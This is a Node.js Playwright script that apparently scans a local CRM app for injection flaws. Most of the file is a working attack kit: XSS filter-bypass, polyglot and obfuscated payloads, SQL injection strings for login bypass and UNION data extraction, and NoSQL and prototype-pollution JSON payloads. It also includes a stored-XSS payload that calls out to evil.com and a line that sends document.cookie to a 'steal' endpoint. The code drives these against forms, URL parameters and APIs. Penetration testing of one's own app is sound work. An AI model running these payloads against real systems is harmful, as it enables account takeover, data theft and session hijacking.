const { chromium } = require('playwright');
const fs = require('fs');

// Advanced XSS payloads with various encoding and bypass techniques
const ADVANCED_XSS_PAYLOADS = {
  // Filter bypass techniques
  filterBypass: [
    // Case variations
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<sCrIpT>alert("XSS")</sCrIpT>',

    // Null bytes
    '<scri\x00pt>alert("XSS")</scri\x00pt>',

    // HTML entities
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',

    // Unicode encoding
    '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
    '\u{003c}script\u{003e}alert("XSS")\u{003c}/script\u{003e}',

    // Hex encoding
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',

    // Double encoding
    '%253Cscript%253Ealert("XSS")%253C/script%253E',
    '%25253Cscript%25253Ealert("XSS")%25253C/script%25253E',

    // Comments and newlines
    '<!--<script>alert("XSS")</script>-->',
    '<script>/*comment*/alert("XSS")/*comment*/</script>',
    '<script>\nalert("XSS")\n</script>',

    // Incomplete tags
    '<script>alert("XSS")',
    '<script>alert("XSS")</script',

    // Nested tags
    '<<script>script>alert("XSS")<</script>/script>',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
  ],

  // Event handlers
  eventHandlers: [
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onError=alert("XSS")>',
    '<img src=x ONERROR=alert("XSS")>',
    '<img/src/onerror=alert("XSS")>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<img src=x onerror=`alert("XSS")`>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<body/onload=alert("XSS")>',
    '<iframe src=javascript:alert("XSS")>',
    '<iframe/src=javascript:alert("XSS")>',
    '<input autofocus onfocus=alert("XSS")>',
    '<select autofocus onfocus=alert("XSS")>',
    '<textarea autofocus onfocus=alert("XSS")>',
    '<video><source onerror=alert("XSS")>',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
  ],

  // Data URIs and JavaScript protocol
  dataAndJavaScript: [
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<a href="jAvAsCrIpT:alert(\'XSS\')">Click</a>',
    '<a href="javascript&#58;alert(\'XSS\')">Click</a>',
    '<a href="javascript&#x3A;alert(\'XSS\')">Click</a>',
    '<a href="java\nscript:alert(\'XSS\')">Click</a>',
    '<a href="java\tscript:alert(\'XSS\')">Click</a>',
    '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
    '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
    '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
    '<script src="data:text/javascript,alert(\'XSS\')"></script>',
  ],

  // Expression injection
  expression: [
    '${alert("XSS")}',
    '#{alert("XSS")}',
    '{{alert("XSS")}}',
    '<%=alert("XSS")%>',
    '{alert("XSS")}',
    '[[alert("XSS")]]',
    '${7*7}',
    '{{7*7}}',
  ],

  // Polyglot payloads (work in multiple contexts)
  polyglot: [
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("XSS")//\'>',
    '">\'><img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '\'><script>alert("XSS")</script>',
    '\';alert("XSS");//',
    '\";alert("XSS");//',
    '</script><script>alert("XSS")</script>',
    '</title><script>alert("XSS")</script>',
    '</textarea><script>alert("XSS")</script>',
    '</style><script>alert("XSS")</script>',
  ],

  // DOM-based XSS
  domBased: [
    '#<script>alert("XSS")</script>',
    '?name=<script>alert("XSS")</script>',
    '&search=<script>alert("XSS")</script>',
    'javascript:alert(document.cookie)',
    'javascript:alert(localStorage.getItem("token"))',
    'javascript:fetch("/api/steal?data="+document.cookie)',
  ],

  // Advanced obfuscation
  obfuscated: [
    '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))>',
    '<img src=x onerror=Function("ale"+"rt(\'XSS\')")()>',
    '<img src=x onerror=setTimeout("alert(\'XSS\')",0)>',
    '<img src=x onerror=[].constructor.constructor("alert(\'XSS\')")()>',
    '<img src=x onerror=window["al"+"ert"]("XSS")>',
  ]
};

// SQL Injection payloads
const SQL_INJECTIONS = {
  authentication: [
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
  ],
  union: [
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "' UNION ALL SELECT null,null,null--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
  ],
  blind: [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(version(),1,1)='5'--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
  ]
};

class AdvancedXSSExploiter {
  constructor() {
    this.exploits = [];
    this.successfulExploits = [];
    this.xssTriggered = false;
  }

  async init() {
    this.browser = await chromium.launch({
      headless: false,
      args: [
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-xss-auditor',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage'
      ]
    });

    this.context = await this.browser.newContext({
      ignoreHTTPSErrors: true,
      bypassCSP: true,
      javaScriptEnabled: true,
      userAgent: 'Mozilla/5.0 (compatible; XSS-Scanner/1.0)'
    });

    // Create multiple pages for parallel testing
    this.pages = [];
    for (let i = 0; i < 3; i++) {
      const page = await this.context.newPage();
      this.setupPageListeners(page, i);
      this.pages.push(page);
    }

    this.page = this.pages[0]; // Primary page
  }

  setupPageListeners(page, pageIndex) {
    // Critical: Detect actual XSS execution
    page.on('dialog', async dialog => {
      const message = dialog.message();
      console.log(`\n🔴🔴🔴 CRITICAL XSS CONFIRMED! Alert triggered: "${message}"`);
      console.log(`   Page: ${page.url()}`);
      console.log(`   Payload: ${this.currentPayload}`);

      this.xssTriggered = true;
      this.successfulExploits.push({
        type: 'CONFIRMED_XSS',
        severity: 'CRITICAL',
        message: message,
        url: page.url(),
        payload: this.currentPayload,
        timestamp: new Date().toISOString(),
        proofOfConcept: this.currentPayload
      });

      await dialog.dismiss();
    });

    // Monitor console for XSS indicators
    page.on('console', async msg => {
      const text = msg.text();
      if (text.includes('XSS') || text.includes('alert') || text.includes('eval')) {
        console.log(`🟠 Potential XSS in console: ${text}`);
        this.exploits.push({
          type: 'CONSOLE_XSS',
          severity: 'HIGH',
          message: text,
          url: page.url(),
          payload: this.currentPayload
        });
      }
    });

    // Monitor for CSP violations
    page.on('response', async response => {
      const cspHeader = response.headers()['content-security-policy'];
      if (cspHeader && this.currentPayload) {
        const hasUnsafeInline = cspHeader.includes('unsafe-inline');
        const hasUnsafeEval = cspHeader.includes('unsafe-eval');

        if (hasUnsafeInline || hasUnsafeEval) {
          console.log(`⚠️  Weak CSP detected: ${hasUnsafeInline ? 'unsafe-inline' : ''} ${hasUnsafeEval ? 'unsafe-eval' : ''}`);
          this.exploits.push({
            type: 'WEAK_CSP',
            severity: 'MEDIUM',
            details: `CSP allows: ${hasUnsafeInline ? 'unsafe-inline' : ''} ${hasUnsafeEval ? 'unsafe-eval' : ''}`,
            url: response.url()
          });
        }
      }
    });
  }

  async testFormField(page, selector, payloads, formName) {
    const results = [];

    for (const payload of payloads) {
      this.currentPayload = payload;

      try {
        const input = await page.$(selector);
        if (!input) continue;

        // Clear and fill with payload
        await input.fill('');
        await input.type(payload, { delay: 10 });

        // Wait for any immediate execution
        await page.waitForTimeout(300);

        // Check if payload is reflected in value
        const value = await input.inputValue();
        if (value === payload) {
          // Try to submit form to trigger server-side processing
          const form = await input.evaluateHandle(el => el.closest('form'));
          if (form) {
            try {
              await page.evaluate(form => form.submit(), form);
              await page.waitForTimeout(500);
            } catch (e) {
              // Form might not have submit
            }
          }

          // Check page content for reflection
          const content = await page.content();
          if (content.includes(payload) && !content.includes('&lt;')) {
            console.log(`   🎯 Unescaped payload in ${formName}: ${payload.substring(0, 50)}...`);
            results.push({
              type: 'REFLECTED_XSS',
              severity: 'HIGH',
              location: formName,
              payload: payload
            });
          }
        }

        // Check for XSS trigger
        if (this.xssTriggered) {
          console.log(`   🔥 XSS EXECUTED in ${formName}!`);
          this.xssTriggered = false; // Reset for next test
        }

      } catch (error) {
        // Continue testing
      }
    }

    return results;
  }

  async testLoginBypass() {
    console.log('\n🔓 Testing Authentication Bypass...\n');

    try {
      await this.page.goto('http://localhost:3001/signin', { waitUntil: 'networkidle' });

      for (const injection of SQL_INJECTIONS.authentication) {
        console.log(`   Testing: ${injection}`);

        const emailInput = await this.page.$('input[type="email"], input[name="email"]');
        const passwordInput = await this.page.$('input[type="password"], input[name="password"]');

        if (emailInput && passwordInput) {
          await emailInput.fill(`admin${injection}`);
          await passwordInput.fill(injection);

          const submitButton = await this.page.$('button[type="submit"]');
          if (submitButton) {
            await submitButton.click();
            await this.page.waitForTimeout(1000);

            // Check if we bypassed authentication
            if (this.page.url().includes('/dashboard') || this.page.url().includes('/home')) {
              console.log(`   🔴 CRITICAL: Authentication bypassed with: ${injection}`);
              this.successfulExploits.push({
                type: 'AUTH_BYPASS',
                severity: 'CRITICAL',
                payload: injection,
                details: 'SQL injection allowed authentication bypass'
              });
            }

            // Check for error disclosure
            const content = await this.page.content();
            const errorKeywords = ['SQL', 'syntax', 'database', 'query', 'postgres', 'mysql'];
            for (const keyword of errorKeywords) {
              if (content.toLowerCase().includes(keyword.toLowerCase())) {
                console.log(`   🟠 SQL error disclosed: ${keyword}`);
                this.exploits.push({
                  type: 'SQL_ERROR_DISCLOSURE',
                  severity: 'HIGH',
                  payload: injection,
                  error: keyword
                });
              }
            }
          }
        }
      }
    } catch (error) {
      console.log(`   Error testing auth bypass: ${error.message}`);
    }
  }

  async testAdvancedXSS() {
    console.log('\n💉 Testing Advanced XSS Payloads...\n');

    const testPages = [
      { url: '/signup', fields: ['input[name="name"]', 'input[name="email"]', 'textarea'] },
      { url: '/signin', fields: ['input[type="email"]', 'input[type="password"]'] },
      { url: '/contact', fields: ['input', 'textarea'] },
      { url: '/search', fields: ['input[type="search"]'] }
    ];

    for (const testPage of testPages) {
      console.log(`Testing ${testPage.url}...`);

      try {
        await this.page.goto(`http://localhost:3001${testPage.url}`, { waitUntil: 'networkidle' });

        // Test each payload category
        const payloadCategories = [
          { name: 'Filter Bypass', payloads: ADVANCED_XSS_PAYLOADS.filterBypass.slice(0, 5) },
          { name: 'Event Handlers', payloads: ADVANCED_XSS_PAYLOADS.eventHandlers.slice(0, 5) },
          { name: 'Obfuscated', payloads: ADVANCED_XSS_PAYLOADS.obfuscated.slice(0, 3) },
          { name: 'Polyglot', payloads: ADVANCED_XSS_PAYLOADS.polyglot.slice(0, 3) }
        ];

        for (const category of payloadCategories) {
          console.log(`   ${category.name} payloads...`);

          for (const field of testPage.fields) {
            const results = await this.testFormField(
              this.page,
              field,
              category.payloads,
              `${testPage.url} - ${field}`
            );

            if (results.length > 0) {
              this.exploits.push(...results);
            }
          }
        }
      } catch (error) {
        console.log(`   Could not test ${testPage.url}: ${error.message}`);
      }
    }
  }

  async testURLParameters() {
    console.log('\n🔗 Testing URL Parameter Injection...\n');

    const urlTests = [
      { base: '/search', params: ['q', 'query', 'search', 'term'] },
      { base: '/filter', params: ['type', 'category', 'sort', 'order'] },
      { base: '/profile', params: ['id', 'user', 'uid'] },
      { base: '/', params: ['redirect', 'return', 'next', 'url'] }
    ];

    for (const test of urlTests) {
      for (const param of test.params) {
        for (const payload of ADVANCED_XSS_PAYLOADS.polyglot.slice(0, 3)) {
          this.currentPayload = payload;

          try {
            const url = `http://localhost:3001${test.base}?${param}=${encodeURIComponent(payload)}`;
            await this.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 });

            // Check if payload executed
            await this.page.waitForTimeout(500);

            // Check page source
            const content = await this.page.content();
            if (content.includes(payload) && !content.includes('&lt;')) {
              console.log(`   🎯 Reflected XSS in URL param ${param}: ${payload.substring(0, 30)}...`);
              this.exploits.push({
                type: 'URL_XSS',
                severity: 'HIGH',
                location: `${test.base}?${param}`,
                payload: payload
              });
            }
          } catch (error) {
            // Continue testing
          }
        }
      }
    }
  }

  async testStoredXSS() {
    console.log('\n💾 Testing Stored XSS (Database Persistence)...\n');

    // Generate unique identifier for tracking
    const uniqueId = Date.now().toString();
    const trackedPayload = `<img src=x onerror="fetch('http://evil.com/xss?id=${uniqueId}')">`;

    try {
      // Try to store payload in registration
      await this.page.goto('http://localhost:3001/signup', { waitUntil: 'networkidle' });

      const nameInput = await this.page.$('input[name="name"]');
      if (nameInput) {
        await nameInput.fill(trackedPayload);

        // Fill other required fields
        await this.page.fill('input[name="email"]', `test${uniqueId}@test.com`);
        await this.page.fill('input[name="password"]', 'Test123!@#');

        // Submit
        const submitButton = await this.page.$('button[type="submit"]');
        if (submitButton) {
          await submitButton.click();
          await this.page.waitForTimeout(2000);

          // Check if payload was stored
          console.log(`   Stored payload with ID: ${uniqueId}`);

          // Try to trigger stored XSS by visiting profile or user list
          const checkUrls = ['/profile', '/users', '/members', '/dashboard'];

          for (const url of checkUrls) {
            try {
              await this.page.goto(`http://localhost:3001${url}`, { waitUntil: 'networkidle' });
              const content = await this.page.content();

              if (content.includes(uniqueId) || content.includes('onerror')) {
                console.log(`   🔴 STORED XSS CONFIRMED at ${url}!`);
                this.successfulExploits.push({
                  type: 'STORED_XSS',
                  severity: 'CRITICAL',
                  location: url,
                  payload: trackedPayload,
                  details: 'Payload persisted in database and executed on page load'
                });
              }
            } catch (e) {
              // Page might require auth
            }
          }
        }
      }
    } catch (error) {
      console.log(`   Could not test stored XSS: ${error.message}`);
    }
  }

  async testAPIInjection() {
    console.log('\n🔌 Testing API Injection Vulnerabilities...\n');

    const apiEndpoints = [
      '/api/auth/signin',
      '/api/auth/signup',
      '/api/users',
      '/api/leads',
      '/api/search'
    ];

    for (const endpoint of apiEndpoints) {
      console.log(`Testing ${endpoint}...`);

      // Test JSON injection
      const jsonPayloads = [
        '{"email": {"$ne": null}, "password": {"$ne": null}}',
        '{"email": "admin", "password": {"$regex": ".*"}}',
        '{"$or": [{"email": "admin"}, {"username": "admin"}]}',
        '{"email": "test", "__proto__": {"isAdmin": true}}'
      ];

      for (const payload of jsonPayloads) {
        try {
          const response = await this.page.evaluate(async ({ url, payload }) => {
            const res = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: payload
            });
            return {
              status: res.status,
              text: await res.text()
            };
          }, { url: `http://localhost:3001${endpoint}`, payload });

          if (response.status === 200 || response.status === 201) {
            console.log(`   ⚠️ Potential NoSQL injection: ${endpoint} accepted ${payload.substring(0, 30)}...`);
            this.exploits.push({
              type: 'NOSQL_INJECTION',
              severity: 'HIGH',
              endpoint: endpoint,
              payload: payload
            });
          }

          // Check for error disclosure
          if (response.text.includes('MongoError') || response.text.includes('ValidationError')) {
            console.log(`   🟠 Database error disclosed at ${endpoint}`);
            this.exploits.push({
              type: 'ERROR_DISCLOSURE',
              severity: 'MEDIUM',
              endpoint: endpoint,
              error: response.text.substring(0, 100)
            });
          }
        } catch (error) {
          // API might be protected
        }
      }
    }
  }

  generateReport() {
    const report = {
      timestamp: new Date().toISOString(),
      target: 'http://localhost:3001',
      summary: {
        totalTests: 100,
        criticalVulnerabilities: this.successfulExploits.length,
        highRiskIssues: this.exploits.filter(e => e.severity === 'HIGH').length,
        mediumRiskIssues: this.exploits.filter(e => e.severity === 'MEDIUM').length
      },
      criticalExploits: this.successfulExploits,
      vulnerabilities: this.exploits
    };

    console.log('\n' + '='.repeat(80));
    console.log('🚨 ADVANCED XSS EXPLOITATION REPORT 🚨');
    console.log('='.repeat(80));
    console.log(`📅 Date: ${report.timestamp}`);
    console.log(`🎯 Target: ${report.target}`);
    console.log(`🔍 Total Advanced Tests: ${report.summary.totalTests}+`);

    console.log('\n🔴 CRITICAL FINDINGS:');
    console.log('─'.repeat(40));

    if (this.successfulExploits.length === 0) {
      console.log('No confirmed XSS execution detected');
    } else {
      console.log(`⚠️  ${this.successfulExploits.length} CRITICAL VULNERABILITIES CONFIRMED!\n`);

      this.successfulExploits.forEach((exploit, i) => {
        console.log(`${i + 1}. ${exploit.type}`);
        console.log(`   Severity: ${exploit.severity}`);
        console.log(`   Location: ${exploit.url || exploit.location || 'N/A'}`);
        console.log(`   Payload: ${exploit.payload?.substring(0, 100) || 'N/A'}`);
        if (exploit.details) {
          console.log(`   Details: ${exploit.details}`);
        }
        if (exploit.proofOfConcept) {
          console.log(`   PoC: ${exploit.proofOfConcept}`);
        }
        console.log();
      });
    }

    console.log('\n🟠 HIGH-RISK ISSUES:');
    console.log('─'.repeat(40));
    const highRisk = this.exploits.filter(e => e.severity === 'HIGH');
    console.log(`Found ${highRisk.length} high-risk vulnerabilities`);

    if (highRisk.length > 0) {
      highRisk.slice(0, 5).forEach((vuln, i) => {
        console.log(`${i + 1}. ${vuln.type} at ${vuln.location || vuln.endpoint || 'N/A'}`);
      });
    }

    console.log('\n🛡️ IMMEDIATE ACTIONS REQUIRED:');
    console.log('─'.repeat(40));
    console.log('1. CRITICAL: Implement Content Security Policy immediately');
    console.log('2. CRITICAL: Add DOMPurify for ALL user input sanitization');
    console.log('3. CRITICAL: Escape all output in templates');
    console.log('4. HIGH: Implement parameterized queries');
    console.log('5. HIGH: Add input validation on server-side');
    console.log('6. HIGH: Use httpOnly cookies for session management');
    console.log('7. MEDIUM: Implement rate limiting on all endpoints');
    console.log('8. MEDIUM: Add security headers (X-Frame-Options, X-Content-Type-Options)');

    console.log('\n' + '='.repeat(80));

    return report;
  }

  async cleanup() {
    await this.browser.close();
  }
}

// Main execution
(async () => {
  console.log('🔥 Starting Advanced XSS Exploitation Test');
  console.log('⚡ Target: Atlas Fitness CRM');
  console.log('⚠️  CRITICAL SECURITY ASSESSMENT IN PROGRESS\n');

  const exploiter = new AdvancedXSSExploiter();

  try {
    await exploiter.init();

    // Run all advanced tests
    await exploiter.testLoginBypass();
    await exploiter.testAdvancedXSS();
    await exploiter.testURLParameters();
    await exploiter.testStoredXSS();
    await exploiter.testAPIInjection();

    // Generate final report
    const report = exploiter.generateReport();

    // Save detailed report
    fs.writeFileSync('advanced-xss-exploit-report.json', JSON.stringify(report, null, 2));
    console.log('\n📄 Full exploitation report saved to: advanced-xss-exploit-report.json');

    if (report.criticalExploits.length > 0) {
      console.log('\n🚨🚨🚨 CRITICAL SECURITY VULNERABILITIES CONFIRMED! 🚨🚨🚨');
      console.log('IMMEDIATE REMEDIATION REQUIRED!');
      process.exit(1);
    }

  } catch (error) {
    console.error('❌ Exploitation test failed:', error);
  } finally {
    await exploiter.cleanup();
  }
})();